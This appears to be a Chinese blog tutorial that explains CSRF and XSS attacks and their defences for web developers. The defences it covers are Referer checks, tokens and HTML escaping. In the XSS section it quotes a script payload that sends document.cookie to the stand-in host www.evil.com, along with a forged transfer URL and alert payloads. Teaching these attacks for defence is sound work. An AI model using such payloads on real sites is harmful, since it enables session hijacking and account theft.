---
title: CSRF 与 XSS
date: 2018-08-21
tags: 网络安全
---

CSRF 与 XSS都为跨站式的请求攻击容易让人混淆，本文将对这两种攻击及对应防范方法进行梳理。

<!-- more -->

### CSRF (Cross-Site Request Forgery) 跨站请求伪造

攻击者盗用了用户的身份以用户的名义进行恶意请求，如发送邮件、银行转账等。

如用户 A 在 example 网站上进行转账，通过 http://example.com/withdraw?user=A&amount=100 进行转账请求并携带存储在浏览器的相关验证信息如 cookie ，服务器通过对 cookie 的验证确认用户信息完成转账。

若 A 在保持 example 网站登录时访问了恶意网站，并被引诱点击链接 http://example.com/withdraw?user=A&amount=100 ，因浏览器关于此网站的相关验证信息还没过期，该请求也携带相关验证信息对服务器进行请求，服务器通过对验证信息的确认认为用户身份没有问题也完成转账。

由此攻击者利用服务器对浏览器的信任成功盗用用户 A 的身份进行银行转账。

#### 防御

#### 1. 使用 HTTP 头部的REFERER字段

请求头中的 REFERER 字段记录了请求来源的地址，在处理敏感信息时一般将请求地址与 Referer 字段处于同一域名下，服务器可以通过对 REFERER 值判断该请求是否正常。从恶意网站中被引诱点击的请求 REFERER 值为该恶意网站，由此服务器可以拒绝此请求。
此方式简单易用，仅需要在服务器判断 REFERER 字段值即可。然而虽然 HTTP 协议规定了不可对 REFERER 字段进行修改，实际上并不能保证浏览器的具体实现，有些低级浏览器的安全漏洞也使得攻击者对 REFERER 字段进行修改。

#### 2. 使用验证码

验证码强制用户必须参与请求交互，通常情况下可以很好防止 CSRF 攻击。但出于用户体验的考虑，一个网站并不可能每个请求都需要用户输入验证码。此方法只能作为协助手段，并不能通用解决 CSRF 问题。

#### 3. 使用 Anti CSRF Token 验证

CSRF 攻击者利用了存储在浏览器的验证信息通过服务器验证，其实只要验证信息不直接存储在浏览器中即可防范。
服务器可以使用 cookie 或 Session 携带验证信息的 token ，但直接使用 cookie 或 Session 进行请求并不能通过服务器验证，而是需要客户端获取 cookie 或 Session 中 token 信息并在请求头设置验证字段发送请求。
浏览器的同源策略使得处于不同域名下的恶意网站并不能获取分析浏览器中的 cookie 或 Session 信息，从而不能设置具体的请求验证字段通过服务器验证。
此方法最为常用。

### XSS (Cross-site scripting) 跨站脚本

攻击者利用网页开始时留下的漏洞，通过巧妙的方法往网页中注入恶意代码，使用户加载和执行这些恶意代码从而达到网页攻击的作用，如修改网页内容，盗取网站 cookie 或会话信息等。

如一个网站上有留言板，将用户输入信息显示出来，若不对输入信息进行处理，攻击者便有机会往留言板写入恶意 JS 代码进行攻击。
正常用户往留言板留言：
```
Nice!
```
留言板的 HTML 代码将为：
```html
//  这是一个正常显示的留言板
<div> 
    Nice
</div>
```
恶意攻击者往留言板留言：
```html
<script>alert('you are attacked!');</script>
```
留言板的 HTML 代码将为：
```html
<!--  这是一个被攻击的留言板 -->
<div> 
    <script>alert('you are attacked!');</script>   
</div> 
```
其中的 JS 代码将会执行，浏览器弹出对话框显示 you are attacked!。这只是弹出对话框吓一下你，然而当攻击者通过留言获取网站的 cookie 信息就危险了：
```html
<script>window.open(www.evil.com?content=document.cookie);</script>
```
www.evil.com 便可得到用户在该网站的 cookie 信息了。

#### 防御

#### 1. 对输入值进行转义

其实本质就是不相信任何用户输入，不能将用户输入直接写到 HMLT DOM 结果里。若网站开发者将留言板的输入信息过滤掉<scirpt></sciprt>这个 HTML 元素，其中的 JS 代码将不会被浏览器解析危害用户了。开发者可使用以下[规则](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet)对输入值进行转义：

| 转义类型 | 转义方式 |
| ------- | --------------------------------------- |
| HTML 实体转义 | &amp; 转为  &amp;amp; <br> &lt; 转为 &amp;lt; <br> &gt; 转为 &amp;gt; <br> &quot; 转为 &amp;quot; <br> &#27; 转为 &amp;#27; <br> &#x2F; 转为 &amp;#x2F; |
| HTML 属性编码 | 除了字母，转换所有字符为 &amp;#xHH; 形式，包括空格（HH = Hex 数值）    |
| URL 编码     | URL编码应该只用于参数部分，而不是整个URL或URL路径部分。<br> 标准的编码可参考 http://www.w3schools.com/tags/ref_urlencode.asp    |
| JavaScript 编码  | 除了字母，转换所有字符为 \uXXXX 的 unicode 转义形式（X = 整数）     |
| CSS Hex 编码   |  CSS 转义支持 \XX 和 \XXXXXX 的形式。如果下一个字符会继续转义序列，那使用两个字符的转义形式可能会出现问题。<br> 有两种解决办法（a）在 CSS 转义后添加一个空格（会被 CSS 解析器忽略）（b）使用0填充以实现完整的 CSS 转义格式。 |

如用户输入内容是：
```html
<script>alert('attacked!');</script>
```
转义后的字符串是：
```html
&lt;script&gt;alert(&quot;attacked!&quot;)&lt;/script&gt;
```

浏览器遇到 <script></script> 字符串会对其进行 JS 代码解析，但遇到 ```&lt;&gt;``` 这样的字符就不会当做 JS 代码执行而仅作为普通字符串打印，由此可以防范代码注入。
当今的主流前端框架如 [Angular](https://angular.cn/guide/security) 等已支持对输入值的无公害处理以防范 XSS ，使用这些框架我们则不需要自己对输入信息进行转义。

### 总结
可以说 XSS 利用的是用户对指定网站的信任; CSRF 利用的是网站对用户网页浏览器的信任。
使用对应的手段可以防御一定的网络攻击，但作为开发者，我们也只能尽可能提高网络攻击的难度，没有一定安全的网络。只有进一步提高攻击者的门槛使得网络逼近绝对安全的位置。